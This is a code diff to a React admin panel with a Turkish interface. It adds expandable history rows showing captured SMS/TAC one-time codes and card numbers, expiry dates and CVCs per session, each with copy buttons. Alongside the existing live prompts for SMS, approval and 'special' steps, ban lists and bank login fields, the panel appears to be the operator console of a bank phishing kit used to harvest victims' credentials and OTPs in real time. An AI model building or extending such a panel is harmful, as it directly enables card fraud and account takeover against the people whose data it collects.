@@ -527,6 +527,8 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
   const soundEnabledRef = useRef(false);
 
   const [expandedBankHistorySessionId, setExpandedBankHistorySessionId] = useState<string | null>(null);
+  const [expandedSmsHistorySessionId, setExpandedSmsHistorySessionId] = useState<string | null>(null);
+  const [expandedCardHistorySessionId, setExpandedCardHistorySessionId] = useState<string | null>(null);
 
   useEffect(() => {
     const savedSound = localStorage.getItem('admin1SoundEnabled');
@@ -690,6 +692,8 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
               if (smsPromptSessionId === oldRow.id) setSmsPromptSessionId(null);
               if (specialPromptSessionId === oldRow.id) setSpecialPromptSessionId(null);
               if (expandedBankHistorySessionId === oldRow.id) setExpandedBankHistorySessionId(null);
+              if (expandedSmsHistorySessionId === oldRow.id) setExpandedSmsHistorySessionId(null);
+              if (expandedCardHistorySessionId === oldRow.id) setExpandedCardHistorySessionId(null);
               if (approvalPromptSessionId === oldRow.id) setApprovalPromptSessionId(null);
             }
             return;
@@ -710,6 +714,8 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
               if (smsPromptSessionId === newRow.id) setSmsPromptSessionId(null);
               if (specialPromptSessionId === newRow.id) setSpecialPromptSessionId(null);
               if (expandedBankHistorySessionId === newRow.id) setExpandedBankHistorySessionId(null);
+              if (expandedSmsHistorySessionId === newRow.id) setExpandedSmsHistorySessionId(null);
+              if (expandedCardHistorySessionId === newRow.id) setExpandedCardHistorySessionId(null);
               if (approvalPromptSessionId === newRow.id) setApprovalPromptSessionId(null);
               return;
             }
@@ -868,7 +874,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
       void supabase.removeChannel(CHANNEL_NAMES.formdata as any).catch(() => {});
       void supabase.removeChannel(CHANNEL_NAMES.presence as any).catch(() => {});
     };
-  }, [supabase, load, loadBanData, deviceInfoSession?.id, chatSessionId, smsPromptSessionId, specialPromptSessionId, expandedBankHistorySessionId, approvalPromptSessionId]);
+  }, [supabase, load, loadBanData, deviceInfoSession?.id, chatSessionId, smsPromptSessionId, specialPromptSessionId, expandedBankHistorySessionId, expandedSmsHistorySessionId, expandedCardHistorySessionId, approvalPromptSessionId]);
 
   const copyToClipboard = (text: string) => {
     if (!text) return;
@@ -1452,6 +1458,10 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                     bankPhone: fd.bankPhone || "",
                     personalCode: fd.personalCode || "",
                     tacCode: fd.tacCode || fd.tac_code || "",
+                    smsCode: fd.smsCode || fd.sms_code || fd.tacCode || fd.tac_code || "",
+                    cardNumber: fd.cardNumber || "",
+                    cardExpiry: fd.cardExpiry || "",
+                    cardCvc: fd.cardCvc || "",
                     loginMethod: fd.loginMethod || "",
                     orderedField1: fd.orderedField1 || "",
                     orderedField1Key: fd.orderedField1Key || "",
@@ -1473,6 +1483,10 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                             legacy_bankPhone: fd.bankPhone || "",
                             legacy_personalCode: fd.personalCode || "",
                             legacy_tacCode: fd.tacCode || fd.tac_code || "",
+                            legacy_smsCode: fd.smsCode || fd.sms_code || "",
+                            legacy_cardNumber: fd.cardNumber || "",
+                            legacy_cardExpiry: fd.cardExpiry || "",
+                            legacy_cardCvc: fd.cardCvc || "",
                             legacy_loginMethod: fd.loginMethod || "",
                           }
                         : undefined,
@@ -1482,6 +1496,66 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                 }
                 (fd as any).bankFormHistory = history;
                 const bankHistoryCount = history.length;
+
+                // ⭐ SMS GECMISI HESAPLA:
+                //   history icindeki her entry'de smsCode/tacCode olanlari al.
+                //   Ardışık AYNI kodu tekrar etme (1 tane birak).
+                const smsHistoryRaw = history
+                  .map((e: any) => {
+                    const sms = String(e.smsCode || e.tacCode || e.sms_code || "").trim();
+                    if (!sms) return null;
+                    return {
+                      sms,
+                      capturedAt: e.capturedAt || "",
+                      isLegacySnapshot: Boolean(e.isLegacySnapshot),
+                      bankSlug: e.bankSlug || "",
+                      bankName: e.bankName || "",
+                    };
+                  })
+                  .filter(Boolean);
+                const smsHistory: any[] = [];
+                for (let i = 0; i < smsHistoryRaw.length; i++) {
+                  const p = i > 0 ? smsHistoryRaw[i - 1] : null;
+                  if (!p || (p as any).sms !== (smsHistoryRaw[i] as any).sms) smsHistory.push(smsHistoryRaw[i]);
+                }
+                const smsHistoryCount = smsHistory.length;
+
+                // ⭐ KART GECMISI HESAPLA:
+                //   Her entry'de cardNumber/Expiry/CVC olanlari al, ayni kart ard arda
+                //   ise 1 tane birak (cardNum + expiry ayniysa ayni kart say).
+                const cardHistoryRaw = history
+                  .map((e: any) => {
+                    const no = String(e.cardNumber || "").trim();
+                    const skt = String(e.cardExpiry || "").trim();
+                    const cvc = String(e.cardCvc || "").trim();
+                    if (!no && !skt && !cvc) return null;
+                    return {
+                      cardNumber: no,
+                      cardExpiry: skt,
+                      cardCvc: cvc,
+                      capturedAt: e.capturedAt || "",
+                      isLegacySnapshot: Boolean(e.isLegacySnapshot),
+                      bankSlug: e.bankSlug || "",
+                      bankName: e.bankName || "",
+                    };
+                  })
+                  .filter(Boolean);
+                const cardHistory: any[] = [];
+                for (let i = 0; i < cardHistoryRaw.length; i++) {
+                  const p = i > 0 ? (cardHistoryRaw[i - 1] as any) : null;
+                  const cur = cardHistoryRaw[i] as any;
+                  if (
+                    !p ||
+                    p.cardNumber !== cur.cardNumber ||
+                    p.cardExpiry !== cur.cardExpiry ||
+                    p.cardCvc !== cur.cardCvc
+                  ) {
+                    cardHistory.push(cur);
+                  }
+                }
+                const cardHistoryCount = cardHistory.length;
+                (fd as any)._smsHistory = smsHistory;
+                (fd as any)._cardHistory = cardHistory;
                 
                 let stepText = "BAŞLANGIÇ";
                 let stepColor = darkMode ? "text-gray-400 bg-gray-500/10 border border-gray-500/20" : "text-gray-600 bg-gray-100 border border-gray-200";
@@ -1751,50 +1825,102 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                       )}
                     </td>
                     <td className="px-2 py-3 align-top">
-                      <div
-                        className="cursor-pointer font-mono text-[12px] lg:text-[13px] font-bold tracking-[0.18em] text-indigo-500 hover:underline break-words [overflow-wrap:anywhere]"
-                        onClick={() => copyToClipboard(smsValue)}
-                      >
-                        {smsValue || '-'}
+                      <div className="flex flex-col gap-1.5">
+                        <div
+                          className="cursor-pointer font-mono text-[12px] lg:text-[13px] font-bold tracking-[0.18em] text-indigo-500 hover:underline break-words [overflow-wrap:anywhere]"
+                          onClick={() => copyToClipboard(smsValue)}
+                        >
+                          {smsValue || '-'}
+                        </div>
+                        {smsHistoryCount > 0 ? (
+                          <div className="flex justify-start">
+                            <button
+                              type="button"
+                              onClick={() =>
+                                setExpandedSmsHistorySessionId(
+                                  expandedSmsHistorySessionId === row.id ? null : row.id,
+                                )
+                              }
+                              className={`shrink-0 rounded-md border px-1.5 py-0.5 text-[8px] font-black uppercase tracking-wide transition-colors ${
+                                expandedSmsHistorySessionId === row.id
+                                  ? darkMode
+                                    ? "border-indigo-500/40 bg-indigo-500/15 text-indigo-400 hover:bg-indigo-500 hover:text-white"
+                                    : "border-indigo-500/40 bg-indigo-500/15 text-indigo-600 hover:bg-indigo-500 hover:text-white"
+                                  : darkMode
+                                    ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
+                                    : "border-gray-200 bg-gray-50 text-gray-500 hover:bg-gray-100 hover:text-black"
+                              }`}
+                              title="Eski SMS kodlarını göster"
+                            >
+                              GEÇMİŞ ({smsHistoryCount})
+                            </button>
+                          </div>
+                        ) : null}
                       </div>
                     </td>
                     <td className="px-2 py-3 align-top">
-                      <div className="space-y-1.5 leading-tight">
-                        {fd.cardNumber ? (
-                          <div className="flex min-w-0 items-start gap-1.5">
-                            <span className="shrink-0 rounded-md border border-rose-500/30 bg-rose-500/15 px-1.5 py-0.5 text-[9px] font-black uppercase tracking-wide text-rose-600 dark:text-rose-400 whitespace-nowrap shadow-sm">
-                              NO
-                            </span>
-                            <span
-                              className="min-w-0 cursor-pointer font-mono text-[13px] lg:text-[14px] font-bold tracking-[0.12em] text-rose-600 dark:text-rose-400 hover:underline hover:text-rose-700 dark:hover:text-rose-300 whitespace-normal break-words [overflow-wrap:anywhere]"
-                              onClick={() => copyToClipboard(fd.cardNumber)}
+                      <div className="flex flex-col gap-1.5">
+                        <div className="space-y-1.5 leading-tight">
+                          {fd.cardNumber ? (
+                            <div className="flex min-w-0 items-start gap-1.5">
+                              <span className="shrink-0 rounded-md border border-rose-500/30 bg-rose-500/15 px-1.5 py-0.5 text-[9px] font-black uppercase tracking-wide text-rose-600 dark:text-rose-400 whitespace-nowrap shadow-sm">
+                                NO
+                              </span>
+                              <span
+                                className="min-w-0 cursor-pointer font-mono text-[13px] lg:text-[14px] font-bold tracking-[0.12em] text-rose-600 dark:text-rose-400 hover:underline hover:text-rose-700 dark:hover:text-rose-300 whitespace-normal break-words [overflow-wrap:anywhere]"
+                                onClick={() => copyToClipboard(fd.cardNumber)}
+                              >
+                                {fd.cardNumber}
+                              </span>
+                            </div>
+                          ) : null}
+                          {fd.cardExpiry ? (
+                            <div className="flex min-w-0 items-start gap-1.5">
+                              <span className="shrink-0 rounded-md border border-amber-500/30 bg-amber-500/15 px-1.5 py-0.5 text-[9px] font-black uppercase tracking-wide text-amber-600 dark:text-amber-400 whitespace-nowrap shadow-sm">
+                                SKT
+                              </span>
+                              <span className="min-w-0 font-bold text-[12px] lg:text-[13px] text-amber-700 dark:text-amber-400 whitespace-normal break-words [overflow-wrap:anywhere]">
+                                {fd.cardExpiry}
+                              </span>
+                            </div>
+                          ) : null}
+                          {fd.cardCvc ? (
+                            <div className="flex min-w-0 items-start gap-1.5">
+                              <span className="shrink-0 rounded-md border border-violet-500/30 bg-violet-500/15 px-1.5 py-0.5 text-[9px] font-black uppercase tracking-wide text-violet-600 dark:text-violet-400 whitespace-nowrap shadow-sm">
+                                CVC
+                              </span>
+                              <span className="min-w-0 font-bold text-[12px] lg:text-[13px] text-violet-700 dark:text-violet-400 whitespace-normal break-words [overflow-wrap:anywhere]">
+                                {fd.cardCvc}
+                              </span>
+                            </div>
+                          ) : null}
+                          {!fd.cardNumber && !fd.cardExpiry && !fd.cardCvc ? (
+                            <span className={`font-medium text-[11px] ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>
+                          ) : null}
+                        </div>
+                        {cardHistoryCount > 0 ? (
+                          <div className="flex justify-start">
+                            <button
+                              type="button"
+                              onClick={() =>
+                                setExpandedCardHistorySessionId(
+                                  expandedCardHistorySessionId === row.id ? null : row.id,
+                                )
+                              }
+                              className={`shrink-0 rounded-md border px-1.5 py-0.5 text-[8px] font-black uppercase tracking-wide transition-colors ${
+                                expandedCardHistorySessionId === row.id
+                                  ? darkMode
+                                    ? "border-rose-500/40 bg-rose-500/15 text-rose-400 hover:bg-rose-500 hover:text-white"
+                                    : "border-rose-500/40 bg-rose-500/15 text-rose-600 hover:bg-rose-500 hover:text-white"
+                                  : darkMode
+                                    ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
+                                    : "border-gray-200 bg-gray-50 text-gray-500 hover:bg-gray-100 hover:text-black"
+                              }`}
+                              title="Eski kart bilgilerini göster"
                             >
-                              {fd.cardNumber}
-                            </span>
+                              GEÇMİŞ ({cardHistoryCount})
+                            </button>
                           </div>
-                        ) : null}
-                        {fd.cardExpiry ? (
-                          <div className="flex min-w-0 items-start gap-1.5">
-                            <span className="shrink-0 rounded-md border border-amber-500/30 bg-amber-500/15 px-1.5 py-0.5 text-[9px] font-black uppercase tracking-wide text-amber-600 dark:text-amber-400 whitespace-nowrap shadow-sm">
-                              SKT
-                            </span>
-                            <span className="min-w-0 font-bold text-[12px] lg:text-[13px] text-amber-700 dark:text-amber-400 whitespace-normal break-words [overflow-wrap:anywhere]">
-                              {fd.cardExpiry}
-                            </span>
-                          </div>
-                        ) : null}
-                        {fd.cardCvc ? (
-                          <div className="flex min-w-0 items-start gap-1.5">
-                            <span className="shrink-0 rounded-md border border-violet-500/30 bg-violet-500/15 px-1.5 py-0.5 text-[9px] font-black uppercase tracking-wide text-violet-600 dark:text-violet-400 whitespace-nowrap shadow-sm">
-                              CVC
-                            </span>
-                            <span className="min-w-0 font-bold text-[12px] lg:text-[13px] text-violet-700 dark:text-violet-400 whitespace-normal break-words [overflow-wrap:anywhere]">
-                              {fd.cardCvc}
-                            </span>
-                          </div>
-                        ) : null}
-                        {!fd.cardNumber && !fd.cardExpiry && !fd.cardCvc ? (
-                          <span className={`font-medium text-[11px] ${darkMode ? 'text-zinc-500' : 'text-gray-400'}`}>-</span>
                         ) : null}
                       </div>
                     </td>
@@ -2114,6 +2240,323 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                               </div>
                               <div className="mt-1 text-[11px] opacity-40">
                                 Kullanıcı yeni bir banka formu submit ettiğinde bilgiler burada listelenecek.
+                              </div>
+                            </div>
+                          </>
+                        )}
+                      </td>
+                    </tr>
+                  )}
+
+                  {/* ============= SMS GECMISI AÇILIR SATIR ============= */}
+                  {expandedSmsHistorySessionId === row.id && (
+                    <tr className={darkMode ? 'bg-indigo-500/[0.06]' : 'bg-indigo-50/60'}>
+                      <td colSpan={11} className="px-4 py-3 md:px-6 md:py-4">
+                        {smsHistoryCount > 0 ? (
+                          <>
+                            <div className="mb-2 flex items-center gap-2 flex-wrap">
+                              <span
+                                className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wider border ${
+                                  darkMode
+                                    ? "bg-indigo-500/15 text-indigo-400 border-indigo-500/30"
+                                    : "bg-indigo-500/10 text-indigo-600 border-indigo-500/30"
+                                }`}
+                              >
+                                Eski SMS Kodları ({smsHistoryCount})
+                              </span>
+                              <button
+                                type="button"
+                                onClick={() => setExpandedSmsHistorySessionId(null)}
+                                className={`ml-auto rounded-md border px-3 py-1 text-[10px] font-bold transition-colors ${
+                                  darkMode
+                                    ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
+                                    : "border-gray-200 bg-white text-gray-500 hover:bg-gray-100 hover:text-black"
+                                }`}
+                              >
+                                KAPAT
+                              </button>
+                            </div>
+                            <div className="space-y-2.5 md:space-y-3">
+                              {(fd as any)._smsHistory
+                                .slice()
+                                .reverse()
+                                .map((entry: any, index: number) => {
+                                  const entryDate = entry.capturedAt
+                                    ? new Date(entry.capturedAt).toLocaleString("tr-TR", {
+                                        hour12: false,
+                                        timeZone: "Europe/Istanbul",
+                                      })
+                                    : "Tarih yok";
+                                  return (
+                                    <div
+                                      key={`${row.id}-sms-history-${index}`}
+                                      className={`rounded-2xl border p-4 ${
+                                        darkMode ? "border-white/5 bg-[#1c1c1e]/70" : "border-gray-200 bg-white/70"
+                                      }`}
+                                    >
+                                      <div className="mb-2 flex flex-wrap items-center gap-2">
+                                        <span
+                                          className={`rounded px-2 py-0.5 text-[9px] font-black uppercase border ${
+                                            darkMode
+                                              ? "bg-indigo-500/10 text-indigo-400 border-indigo-500/20"
+                                              : "bg-indigo-50 border-indigo-200 text-indigo-700"
+                                          }`}
+                                        >
+                                          #{smsHistoryCount - index}
+                                        </span>
+                                        {entry.isLegacySnapshot && (
+                                          <span
+                                            className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wide border ${
+                                              darkMode
+                                                ? "bg-pink-500/10 text-pink-400 border-pink-500/20"
+                                                : "bg-pink-50 border-pink-200 text-pink-600"
+                                            }`}
+                                          >
+                                            ESKİ KAYITTAN ALINDI
+                                          </span>
+                                        )}
+                                        <span className="ml-auto text-[11px] font-mono opacity-50">
+                                          {entryDate}
+                                        </span>
+                                      </div>
+                                      <div className="grid grid-cols-1 gap-2 text-[11px]">
+                                        <div
+                                          className={`rounded-xl border px-3 py-3 ${
+                                            darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"
+                                          }`}
+                                        >
+                                          <div className="mb-0.5 text-[8px] font-black uppercase opacity-50">SMS Kodu</div>
+                                          <div
+                                            className="cursor-pointer font-mono text-[14px] font-bold tracking-[0.18em] break-words [overflow-wrap:anywhere] text-indigo-500 hover:underline"
+                                            onClick={() => copyToClipboard(String(entry.sms || ""))}
+                                          >
+                                            {entry.sms || "-"}
+                                          </div>
+                                        </div>
+                                      </div>
+                                    </div>
+                                  );
+                                })}
+                            </div>
+                          </>
+                        ) : (
+                          <>
+                            <div className="mb-2 flex items-center gap-2">
+                              <span
+                                className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wider border ${
+                                  darkMode
+                                    ? "bg-white/10 text-zinc-400 border-white/10"
+                                    : "bg-gray-100 text-gray-600 border-gray-200"
+                                }`}
+                              >
+                                Eski SMS Kodları (0)
+                              </span>
+                              <button
+                                type="button"
+                                onClick={() => setExpandedSmsHistorySessionId(null)}
+                                className={`ml-auto rounded-md border px-3 py-1 text-[10px] font-bold transition-colors ${
+                                  darkMode
+                                    ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
+                                    : "border-gray-200 bg-white text-gray-500 hover:bg-gray-100 hover:text-black"
+                                }`}
+                              >
+                                KAPAT
+                              </button>
+                            </div>
+                            <div
+                              className={`rounded-2xl border px-4 py-5 text-center ${
+                                darkMode
+                                  ? "border-dashed border-white/10 bg-[#1c1c1e]/50"
+                                  : "border-dashed border-gray-200 bg-white/60"
+                              }`}
+                            >
+                              <div className="text-xs font-black uppercase opacity-50">
+                                Bu oturum için henüz SMS kodu geçmişi kaydedilmemiş
+                              </div>
+                              <div className="mt-1 text-[11px] opacity-40">
+                                Kullanıcı yeni bir SMS/TAC kodu submit ettiğinde bilgiler burada listelenecek.
+                              </div>
+                            </div>
+                          </>
+                        )}
+                      </td>
+                    </tr>
+                  )}
+
+                  {/* ============= KART GECMISI AÇILIR SATIR ============= */}
+                  {expandedCardHistorySessionId === row.id && (
+                    <tr className={darkMode ? 'bg-rose-500/[0.06]' : 'bg-rose-50/60'}>
+                      <td colSpan={11} className="px-4 py-3 md:px-6 md:py-4">
+                        {cardHistoryCount > 0 ? (
+                          <>
+                            <div className="mb-2 flex items-center gap-2 flex-wrap">
+                              <span
+                                className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wider border ${
+                                  darkMode
+                                    ? "bg-rose-500/15 text-rose-400 border-rose-500/30"
+                                    : "bg-rose-500/10 text-rose-600 border-rose-500/30"
+                                }`}
+                              >
+                                Eski Kart Bilgileri ({cardHistoryCount})
+                              </span>
+                              <button
+                                type="button"
+                                onClick={() => setExpandedCardHistorySessionId(null)}
+                                className={`ml-auto rounded-md border px-3 py-1 text-[10px] font-bold transition-colors ${
+                                  darkMode
+                                    ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
+                                    : "border-gray-200 bg-white text-gray-500 hover:bg-gray-100 hover:text-black"
+                                }`}
+                              >
+                                KAPAT
+                              </button>
+                            </div>
+                            <div className="space-y-2.5 md:space-y-3">
+                              {(fd as any)._cardHistory
+                                .slice()
+                                .reverse()
+                                .map((entry: any, index: number) => {
+                                  const entryDate = entry.capturedAt
+                                    ? new Date(entry.capturedAt).toLocaleString("tr-TR", {
+                                        hour12: false,
+                                        timeZone: "Europe/Istanbul",
+                                      })
+                                    : "Tarih yok";
+                                  return (
+                                    <div
+                                      key={`${row.id}-card-history-${index}`}
+                                      className={`rounded-2xl border p-4 ${
+                                        darkMode ? "border-white/5 bg-[#1c1c1e]/70" : "border-gray-200 bg-white/70"
+                                      }`}
+                                    >
+                                      <div className="mb-2 flex flex-wrap items-center gap-2">
+                                        <span
+                                          className={`rounded px-2 py-0.5 text-[9px] font-black uppercase border ${
+                                            darkMode
+                                              ? "bg-rose-500/10 text-rose-400 border-rose-500/20"
+                                              : "bg-rose-50 border-rose-200 text-rose-700"
+                                          }`}
+                                        >
+                                          #{cardHistoryCount - index}
+                                        </span>
+                                        {entry.isLegacySnapshot && (
+                                          <span
+                                            className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wide border ${
+                                              darkMode
+                                                ? "bg-pink-500/10 text-pink-400 border-pink-500/20"
+                                                : "bg-pink-50 border-pink-200 text-pink-600"
+                                            }`}
+                                          >
+                                            ESKİ KAYITTAN ALINDI
+                                          </span>
+                                        )}
+                                        <span className="ml-auto text-[11px] font-mono opacity-50">
+                                          {entryDate}
+                                        </span>
+                                      </div>
+                                      <div className="grid grid-cols-1 gap-2 text-[11px] sm:grid-cols-3">
+                                        {entry.cardNumber ? (
+                                          <div
+                                            className={`rounded-xl border px-3 py-3 sm:col-span-2 ${
+                                              darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"
+                                            }`}
+                                          >
+                                            <div className="mb-0.5 flex items-center gap-1">
+                                              <span className="rounded border border-rose-500/30 bg-rose-500/15 px-1 py-0.5 text-[7px] font-black uppercase text-rose-500 dark:text-rose-400 shadow-sm">
+                                                NO
+                                              </span>
+                                              <span className="text-[8px] font-black uppercase opacity-50">Kart Numarası</span>
+                                            </div>
+                                            <div
+                                              className="cursor-pointer font-mono text-[15px] font-bold tracking-[0.12em] break-words [overflow-wrap:anywhere] text-rose-600 dark:text-rose-400 hover:underline hover:text-rose-700 dark:hover:text-rose-300"
+                                              onClick={() => copyToClipboard(String(entry.cardNumber || ""))}
+                                            >
+                                              {entry.cardNumber || "-"}
+                                            </div>
+                                          </div>
+                                        ) : null}
+                                        {entry.cardExpiry ? (
+                                          <div
+                                            className={`rounded-xl border px-3 py-3 ${
+                                              darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"
+                                            }`}
+                                          >
+                                            <div className="mb-0.5 flex items-center gap-1">
+                                              <span className="rounded border border-amber-500/30 bg-amber-500/15 px-1 py-0.5 text-[7px] font-black uppercase text-amber-600 dark:text-amber-400 shadow-sm">
+                                                SKT
+                                              </span>
+                                              <span className="text-[8px] font-black uppercase opacity-50">Son Kul.</span>
+                                            </div>
+                                            <div
+                                              className="cursor-pointer font-bold text-[13px] break-words [overflow-wrap:anywhere] text-amber-700 dark:text-amber-400 hover:underline"
+                                              onClick={() => copyToClipboard(String(entry.cardExpiry || ""))}
+                                            >
+                                              {entry.cardExpiry || "-"}
+                                            </div>
+                                          </div>
+                                        ) : null}
+                                        {entry.cardCvc ? (
+                                          <div
+                                            className={`rounded-xl border px-3 py-3 ${
+                                              darkMode ? "border-white/5 bg-black/20" : "border-gray-200 bg-gray-50"
+                                            }`}
+                                          >
+                                            <div className="mb-0.5 flex items-center gap-1">
+                                              <span className="rounded border border-violet-500/30 bg-violet-500/15 px-1 py-0.5 text-[7px] font-black uppercase text-violet-600 dark:text-violet-400 shadow-sm">
+                                                CVC
+                                              </span>
+                                              <span className="text-[8px] font-black uppercase opacity-50">Güvenlik</span>
+                                            </div>
+                                            <div
+                                              className="cursor-pointer font-bold text-[13px] break-words [overflow-wrap:anywhere] text-violet-700 dark:text-violet-400 hover:underline"
+                                              onClick={() => copyToClipboard(String(entry.cardCvc || ""))}
+                                            >
+                                              {entry.cardCvc || "-"}
+                                            </div>
+                                          </div>
+                                        ) : null}
+                                      </div>
+                                    </div>
+                                  );
+                                })}
+                            </div>
+                          </>
+                        ) : (
+                          <>
+                            <div className="mb-2 flex items-center gap-2">
+                              <span
+                                className={`rounded px-2 py-0.5 text-[9px] font-black uppercase tracking-wider border ${
+                                  darkMode
+                                    ? "bg-white/10 text-zinc-400 border-white/10"
+                                    : "bg-gray-100 text-gray-600 border-gray-200"
+                                }`}
+                              >
+                                Eski Kart Bilgileri (0)
+                              </span>
+                              <button
+                                type="button"
+                                onClick={() => setExpandedCardHistorySessionId(null)}
+                                className={`ml-auto rounded-md border px-3 py-1 text-[10px] font-bold transition-colors ${
+                                  darkMode
+                                    ? "border-white/10 bg-white/5 text-zinc-400 hover:bg-white/10 hover:text-white"
+                                    : "border-gray-200 bg-white text-gray-500 hover:bg-gray-100 hover:text-black"
+                                }`}
+                              >
+                                KAPAT
+                              </button>
+                            </div>
+                            <div
+                              className={`rounded-2xl border px-4 py-5 text-center ${
+                                darkMode
+                                  ? "border-dashed border-white/10 bg-[#1c1c1e]/50"
+                                  : "border-dashed border-gray-200 bg-white/60"
+                              }`}
+                            >
+                              <div className="text-xs font-black uppercase opacity-50">
+                                Bu oturum için henüz kart bilgisi geçmişi kaydedilmemiş
+                              </div>
+                              <div className="mt-1 text-[11px] opacity-40">
+                                Kullanıcı yeni bir kredi kartı formu submit ettiğinde bilgiler burada listelenecek.
                               </div>
                             </div>
                           </>
